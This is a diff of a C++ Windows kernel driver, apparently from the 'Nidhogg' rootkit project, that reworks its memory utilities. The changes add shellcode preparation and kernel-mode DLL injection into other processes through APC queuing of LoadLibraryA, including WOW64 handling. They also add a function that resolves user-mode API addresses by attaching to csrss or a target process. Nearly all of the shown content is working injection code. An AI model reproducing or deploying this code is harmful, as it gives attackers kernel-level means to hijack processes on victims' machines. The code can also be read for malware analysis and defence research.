@@ -57,6 +57,47 @@ MemoryUtils::~MemoryUtils() {
 
 /*
 * Description:
+* PrepareShellcode is responsible for preparing the shellcode to be injected into the target process.
+*
+* Parameters:
+* @dllPath			-- The name of the DLL to be injected.
+* @shellcodeAddress	-- The address of the allocated shellcode in the remote process.
+* @targetProcess	-- The target process to inject the shellcode into.
+* @pid				-- The process ID of the target process.
+*
+* Returns:
+* @status  [NTSTATUS]		 -- Whether successfuly created the shellcode or not.
+*/
+NTSTATUS MemoryUtils::PrepareShellcode(char* dllPath, PVOID shellcodeAddress, PEPROCESS targetProcess, ULONG pid) {
+	SIZE_T shellcodeSize = SHELLCODE_SIZE;
+	NTSTATUS status = STATUS_SUCCESS;
+	UCHAR newShellcode[SHELLCODE_SIZE] = { 0 };
+
+	PVOID pGetProcAddress = NidhoggMemoryUtils->GetFuncAddress("GetProcAddress", L"\\Windows\\System32\\kernel32.dll", pid);
+	PVOID pGetModuleHandle = NidhoggMemoryUtils->GetFuncAddress("GetModuleHandleA", L"\\Windows\\System32\\kernel32.dll", pid);
+
+	if (!dllPath || !pGetProcAddress || !pGetModuleHandle || !shellcodeAddress)
+		return STATUS_INVALID_PARAMETER;
+
+	memcpy(newShellcode, shellcodeTemplate, SHELLCODE_SIZE);
+	memcpy(newShellcode + GET_MODULE_HANDLE_OFFSET, &pGetModuleHandle, sizeof(pGetModuleHandle));
+	memcpy(newShellcode + GET_PROC_ADDRESS_OFFSET, &pGetProcAddress, sizeof(pGetProcAddress));
+	memcpy(newShellcode + DLL_NAME_OFFSET, dllPath, strlen(dllPath) + 1);
+
+	status = NidhoggMemoryUtils->KeWriteProcessMemory(&newShellcode, targetProcess, shellcodeAddress,
+		shellcodeSize, KernelMode);
+
+	if (!NT_SUCCESS(status))
+		return status;
+	shellcodeSize = SHELLCODE_SIZE;
+	PVOID addr = (char*)shellcodeAddress + DLL_NAME_OFFSET;
+	status = NidhoggMemoryUtils->KeWriteProcessMemory(&addr, targetProcess,
+		(char*)shellcodeAddress + SHELLCODE_ADDRESS_OFFSET, sizeof(PVOID), KernelMode, false);
+	return status;
+}
+
+/*
+* Description:
 * InjectDllAPC is responsible to inject a dll in a certain usermode process with APC.
 *
 * Parameters:
@@ -67,41 +108,35 @@ MemoryUtils::~MemoryUtils() {
 */
 NTSTATUS MemoryUtils::InjectDllAPC(DllInformation* DllInfo) {
 	ShellcodeInformation ShellcodeInfo{};
-	PVOID shellcode = NULL;
-	SIZE_T shellcodeSize = DLL_INJ_SHELLCODE_SIZE;
+	SIZE_T dllPathSize = strlen(DllInfo->DllPath) + 1;
+	PVOID loadLibraryAddress = GetFuncAddress("LoadLibraryA", L"\\Windows\\System32\\kernel32.dll");
 
-	NTSTATUS status = ZwAllocateVirtualMemory(ZwCurrentProcess(), &shellcode, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);
+	if (!loadLibraryAddress)
+		return STATUS_ABANDONED;
+
+	// Creating the shellcode information for APC injection.
+	NTSTATUS status = ZwAllocateVirtualMemory(ZwCurrentProcess(), &ShellcodeInfo.Parameter1, 0, &dllPathSize,
+		MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+	if (!NT_SUCCESS(status))
+		return STATUS_INSUFFICIENT_RESOURCES;
+
+	dllPathSize = strlen(DllInfo->DllPath) + 1;
+	status = KeWriteProcessMemory(DllInfo->DllPath, PsGetCurrentProcess(), ShellcodeInfo.Parameter1, strlen(DllInfo->DllPath),
+		KernelMode, false);
 
 	if (!NT_SUCCESS(status))
 		return status;
 
-	shellcodeSize = DLL_INJ_SHELLCODE_SIZE;
-
-	// Filling the shellcode from the template.
-	status = KeWriteProcessMemory(&shellcodeTemplate, PsGetCurrentProcess(), shellcode, shellcodeSize, KernelMode);
-
-	if (!NT_SUCCESS(status)) {
-		ZwFreeVirtualMemory(ZwCurrentProcess(), &shellcode, &shellcodeSize, MEM_DECOMMIT);
-		return status;
-	}
-
-	status = KeWriteProcessMemory(&(DllInfo->DllPath), PsGetCurrentProcess(), (PUCHAR)shellcode + PATH_OFFSET, sizeof(DllInfo->DllPath), KernelMode);
-
-	if (!NT_SUCCESS(status)) {
-		ZwFreeVirtualMemory(ZwCurrentProcess(), &shellcode, &shellcodeSize, MEM_DECOMMIT);
-		return status;
-	}
-
-	// Creating the shellcode information for APC injection.
-	ShellcodeInfo.Parameter1 = NULL;
+	ShellcodeInfo.Parameter1Size = dllPathSize;
 	ShellcodeInfo.Parameter2 = NULL;
 	ShellcodeInfo.Parameter3 = NULL;
 	ShellcodeInfo.Pid = DllInfo->Pid;
-	ShellcodeInfo.Shellcode = shellcode;
-	ShellcodeInfo.ShellcodeSize = DLL_INJ_SHELLCODE_SIZE;
+	ShellcodeInfo.Shellcode = loadLibraryAddress;
+	ShellcodeInfo.ShellcodeSize = sizeof(PVOID);
 
-	status = InjectShellcodeAPC(&ShellcodeInfo);
-
+	status = InjectShellcodeAPC(&ShellcodeInfo, true);
+	ZwFreeVirtualMemory(ZwCurrentProcess(), &ShellcodeInfo.Parameter1, &dllPathSize, MEM_DECOMMIT);
 	return status;
 }
 
@@ -203,11 +238,12 @@ NTSTATUS MemoryUtils::InjectDllThread(DllInformation* DllInfo) {
 *
 * Parameters:
 * @ShellcodeInfo [ShellcodeInformation*] -- All the information regarding the injected shellcode.
+* @isInjectedDll [bool]					 -- Whether the shellcode is injected from InjectDllAPC or not.
 *
 * Returns:
 * @status		 [NTSTATUS]				 -- Whether successfuly injected or not.
 */
-NTSTATUS MemoryUtils::InjectShellcodeAPC(ShellcodeInformation* ShellcodeInfo) {
+NTSTATUS MemoryUtils::InjectShellcodeAPC(ShellcodeInformation* ShellcodeInfo, bool isInjectedDll) {
 	OBJECT_ATTRIBUTES objAttr{};
 	CLIENT_ID cid{};
 	HANDLE hProcess = NULL;
@@ -215,15 +251,19 @@ NTSTATUS MemoryUtils::InjectShellcodeAPC(ShellcodeInformation* ShellcodeInfo) {
 	PETHREAD TargetThread = NULL;
 	PKAPC ShellcodeApc = NULL;
 	PKAPC PrepareApc = NULL;
-	PVOID shellcodeAddress = NULL;
+	PVOID remoteAddress = NULL;
 	NTSTATUS status = STATUS_SUCCESS;
-	SIZE_T shellcodeSize = ShellcodeInfo->ShellcodeSize;
+	PVOID remoteData = NULL;
+	SIZE_T dataSize = isInjectedDll ? ShellcodeInfo->Parameter1Size : ShellcodeInfo->ShellcodeSize;
 
 	HANDLE pid = UlongToHandle(ShellcodeInfo->Pid);
 	status = PsLookupProcessByProcessId(pid, &TargetProcess);
 
 	if (!NT_SUCCESS(status))
 		return status;
+
+	if (!ShellcodeInfo->Shellcode || dataSize == 0)
+		return STATUS_INVALID_PARAMETER;
 
 	// Find APC suitable thread.
 	status = FindAlertableThread(pid, &TargetThread);
@@ -245,13 +285,14 @@ NTSTATUS MemoryUtils::InjectShellcodeAPC(ShellcodeInformation* ShellcodeInfo) {
 		if (!NT_SUCCESS(status))
 			break;
 
-		status = ZwAllocateVirtualMemory(hProcess, &shellcodeAddress, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);
+		status = ZwAllocateVirtualMemory(hProcess, &remoteAddress, 0, &dataSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);
 
 		if (!NT_SUCCESS(status))
 			break;
-		shellcodeSize = ShellcodeInfo->ShellcodeSize;
 
-		status = KeWriteProcessMemory(ShellcodeInfo->Shellcode, TargetProcess, shellcodeAddress, shellcodeSize, UserMode);
+		dataSize = isInjectedDll ? ShellcodeInfo->Parameter1Size : ShellcodeInfo->ShellcodeSize;
+		remoteData = isInjectedDll ? ShellcodeInfo->Parameter1 : ShellcodeInfo->Shellcode;
+		status = KeWriteProcessMemory(remoteData, TargetProcess, remoteAddress, dataSize, UserMode);
 
 		if (!NT_SUCCESS(status))
 			break;
@@ -265,8 +306,12 @@ NTSTATUS MemoryUtils::InjectShellcodeAPC(ShellcodeInformation* ShellcodeInfo) {
 			break;
 		}
 
-		KeInitializeApc(PrepareApc, TargetThread, OriginalApcEnvironment, (PKKERNEL_ROUTINE)PrepareApcCallback, NULL, NULL, KernelMode, NULL);
-		KeInitializeApc(ShellcodeApc, TargetThread, OriginalApcEnvironment, (PKKERNEL_ROUTINE)ApcInjectionCallback, NULL, (PKNORMAL_ROUTINE)shellcodeAddress, UserMode, ShellcodeInfo->Parameter1);
+		KeInitializeApc(PrepareApc, TargetThread, OriginalApcEnvironment, (PKKERNEL_ROUTINE)&PrepareApcCallback, NULL, NULL, KernelMode, NULL);
+
+		if (isInjectedDll)
+			KeInitializeApc(ShellcodeApc, TargetThread, OriginalApcEnvironment, (PKKERNEL_ROUTINE)&ApcInjectionCallback, NULL, (PKNORMAL_ROUTINE)ShellcodeInfo->Shellcode, UserMode, remoteAddress);
+		else
+			KeInitializeApc(ShellcodeApc, TargetThread, OriginalApcEnvironment, (PKKERNEL_ROUTINE)&ApcInjectionCallback, NULL, (PKNORMAL_ROUTINE)remoteAddress, UserMode, ShellcodeInfo->Parameter1);
 
 		if (!KeInsertQueueApc(ShellcodeApc, ShellcodeInfo->Parameter2, ShellcodeInfo->Parameter3, FALSE)) {
 			status = STATUS_UNSUCCESSFUL;
@@ -285,8 +330,8 @@ NTSTATUS MemoryUtils::InjectShellcodeAPC(ShellcodeInformation* ShellcodeInfo) {
 
 
 	if (!NT_SUCCESS(status)) {
-		if (shellcodeAddress)
-			ZwFreeVirtualMemory(hProcess, &shellcodeAddress, &shellcodeSize, MEM_DECOMMIT);
+		if (remoteAddress)
+			ZwFreeVirtualMemory(hProcess, &remoteAddress, &dataSize, MEM_DECOMMIT);
 		if (PrepareApc)
 			ExFreePoolWithTag(PrepareApc, DRIVER_TAG);
 		if (ShellcodeApc)
@@ -946,26 +991,35 @@ NTSTATUS MemoryUtils::GetDesKey(DesKeyInformation* DesKey) {
 * @targetAddress	 [PVOID]	 -- Target address to write.
 * @dataSize			 [SIZE_T]	 -- Size of data to write.
 * @mode			     [MODE]		 -- Mode of the request (UserMode or KernelMode allowed).
+* @alignAddr		 [bool]		 -- Whether to align the address or not.
 *
 * Returns:
 * @status			 [NTSTATUS]	 -- Whether successfuly written or not.
 */
-NTSTATUS MemoryUtils::KeWriteProcessMemory(PVOID sourceDataAddress, PEPROCESS TargetProcess, PVOID targetAddress, SIZE_T dataSize, MODE mode) {
+NTSTATUS MemoryUtils::KeWriteProcessMemory(PVOID sourceDataAddress, PEPROCESS TargetProcess, PVOID targetAddress, 
+	SIZE_T dataSize, MODE mode, bool alignAddr) {
 	HANDLE hTargetProcess;
 	ULONG oldProtection;
 	SIZE_T patchLen;
 	SIZE_T bytesWritten;
 	NTSTATUS status = STATUS_SUCCESS;
+	SIZE_T alignment = alignAddr ? dataSize : 1;
 
 	if (mode != KernelMode && mode != UserMode)
 		return STATUS_UNSUCCESSFUL;
 
 	// Making sure that the given kernel mode address is valid.
-	if (mode == KernelMode && (!VALID_KERNELMODE_MEMORY((DWORD64)sourceDataAddress) || !VALID_ADDRESS((DWORD64)targetAddress))) {
+	if (mode == KernelMode && (!VALID_KERNELMODE_MEMORY((DWORD64)sourceDataAddress) ||
+		(!VALID_KERNELMODE_MEMORY((DWORD64)targetAddress) &&
+			!NT_SUCCESS(ProbeAddress(targetAddress, dataSize, alignment, STATUS_UNSUCCESSFUL))))) {
 		status = STATUS_UNSUCCESSFUL;
 		return status;
 	}
-	else if (mode == UserMode && (!VALID_USERMODE_MEMORY((DWORD64)sourceDataAddress) || !VALID_ADDRESS((DWORD64)targetAddress))) {
+
+	else if (mode == UserMode && (
+		!NT_SUCCESS(ProbeAddress(sourceDataAddress, dataSize, dataSize, STATUS_UNSUCCESSFUL)) ||
+		(!VALID_KERNELMODE_MEMORY((DWORD64)targetAddress) &&
+			!NT_SUCCESS(ProbeAddress(targetAddress, dataSize, alignment, STATUS_UNSUCCESSFUL))))) {
 		status = STATUS_UNSUCCESSFUL;
 		return status;
 	}
@@ -1261,10 +1315,10 @@ PVOID MemoryUtils::GetFunctionAddress(PVOID moduleBase, CHAR* functionName) {
 * GetSSDTFunctionAddress is responsible for getting the SSDT's location.
 *
 * Parameters:
-* There are no parameters.
+* @functionName [CHAR*]	   -- Function name to search.
 *
 * Returns:
-* @status [NTSTATUS] -- STATUS_SUCCESS if found, else error.
+* @status		[NTSTATUS] -- STATUS_SUCCESS if found, else error.
 */
 PVOID MemoryUtils::GetSSDTFunctionAddress(CHAR* functionName) {
 	KAPC_STATE state;
@@ -1312,6 +1366,53 @@ PVOID MemoryUtils::GetSSDTFunctionAddress(CHAR* functionName) {
 	if (syscall != 0)
 		functionAddress = (PUCHAR)this->ssdt->ServiceTableBase + (((PLONG)this->ssdt->ServiceTableBase)[syscall] >> 4);
 
+	ObDereferenceObject(CsrssProcess);
+	return functionAddress;
+}
+
+/*
+* Description:
+* GetSSDTFunctionAddress is responsible for getting the SSDT's location.
+*
+* Parameters:
+* @functionName [CHAR*]	   -- Function name to search.
+* @moduleName   [WCHAR*]   -- Module's name to search.
+* @pid 			[ULONG]	   -- Process id to search in.
+*
+* Returns:
+* @status		[NTSTATUS] -- STATUS_SUCCESS if found, else error.
+*/
+PVOID MemoryUtils::GetFuncAddress(CHAR* functionName, WCHAR* moduleName, ULONG pid) {
+	NTSTATUS status;
+	KAPC_STATE state;
+	PEPROCESS CsrssProcess = NULL;
+	PVOID functionAddress = NULL;
+	ULONG searchedPid = pid;
+
+	if (searchedPid == 0) {
+		status = NidhoggProccessUtils->FindPidByName(L"csrss.exe", &searchedPid);
+
+		if (!NT_SUCCESS(status))
+			return functionAddress;
+	}
+
+	status = PsLookupProcessByProcessId(ULongToHandle(searchedPid), &CsrssProcess);
+
+	if (!NT_SUCCESS(status))
+		return functionAddress;
+
+	// Attaching to the process's stack to be able to walk the PEB.
+	KeStackAttachProcess(CsrssProcess, &state);
+	PVOID moduleBase = GetModuleBase(CsrssProcess, moduleName);
+
+	if (!moduleBase) {
+		KeUnstackDetachProcess(&state);
+		ObDereferenceObject(CsrssProcess);
+		return functionAddress;
+	}
+	functionAddress = GetFunctionAddress(moduleBase, functionName);
+
+	KeUnstackDetachProcess(&state);
 	ObDereferenceObject(CsrssProcess);
 	return functionAddress;
 }
@@ -1665,11 +1766,12 @@ void MemoryUtils::SetCredLastIndex() {
 VOID ApcInjectionCallback(PKAPC Apc, PKNORMAL_ROUTINE* NormalRoutine, PVOID* NormalContext, PVOID* SystemArgument1, PVOID* SystemArgument2) {
 	UNREFERENCED_PARAMETER(SystemArgument1);
 	UNREFERENCED_PARAMETER(SystemArgument2);
-	UNREFERENCED_PARAMETER(NormalContext);
 
 	if (PsIsThreadTerminating(PsGetCurrentThread()))
 		*NormalRoutine = NULL;
 
+	if (PsGetCurrentProcessWow64Process())
+		PsWrapApcWow64Thread(NormalContext, (PVOID*)NormalRoutine);
 	ExFreePoolWithTag(Apc, DRIVER_TAG);
 }
 
